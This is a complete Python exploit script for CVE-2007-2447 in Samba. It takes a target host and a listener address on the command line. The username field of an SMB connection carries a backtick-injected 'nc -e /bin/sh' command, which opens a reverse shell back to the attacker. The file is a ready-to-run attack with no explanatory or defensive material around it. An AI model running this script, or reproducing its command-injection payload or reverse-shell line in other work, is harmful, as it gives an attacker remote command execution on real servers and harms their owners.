#!/bin/python3
import argparse
from smb.SMBConnection import SMBConnection

def exploitvuln(args):
    user_exploit  = "/`nohup nc -e /bin/sh {0} {1}`".format(args.lhost,args.lport)
    conn = SMBConnection(user_exploit, "", "", "")
    try:
        if not conn.connect(args.rhost,args.rport):
            print("[!] Do not forget to start your listener")

    except Exception as e:
        print("[x] Exception "+str(e))

def get_args():
    parser = argparse.ArgumentParser(description="Receive a reverse shell - CVE-2007-2447. Author: 0xKn")
    parser.add_argument("--rhost", help = "Remote Host", required=True, type=str)
    parser.add_argument("--rport", help = "Remote Port", type=int, default=445)
    parser.add_argument("--lhost", help = "Local Host", required=True, type=str)
    parser.add_argument("--lport", help = "Local Port", required=True, type=str)
    return parser.parse_args()

if __name__ == '__main__':
    try:
        print("[*] Starting the exploit")
        args = get_args()
        exploitvuln(args)
    except KeyboardInterrupt:
        print('[!] Interrupted')
